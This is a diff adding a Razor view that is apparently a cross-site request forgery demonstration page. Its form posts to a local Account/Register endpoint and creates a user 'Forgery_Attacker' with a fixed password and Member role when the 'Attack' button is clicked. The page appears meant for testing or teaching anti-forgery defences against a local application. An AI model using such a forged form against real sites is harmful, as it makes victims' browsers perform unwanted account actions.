@@ -1,0 +1,21 @@
+﻿
+@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>Index</title>
+    <link href="~/css/style.css" rel="stylesheet" />
+</head>
+<body>
+    <h1>Cross-Site Request Forgery Attack</h1>
+    <h3>Click - Submit to Perform the Attack</h3>
+    <form action="http://localhost:55606/Account/Register?FirstName=Forgery_Attacker&LastName=Cross_Site&PhoneNumber=123&Email=attack@@.com&UserName=Forgery_Attacker&Password=123qwe!!!QWE123&RoleName=Member" method="post">
+        <input type="submit" value="Attack">
+    </form>
+</body>
+</html>
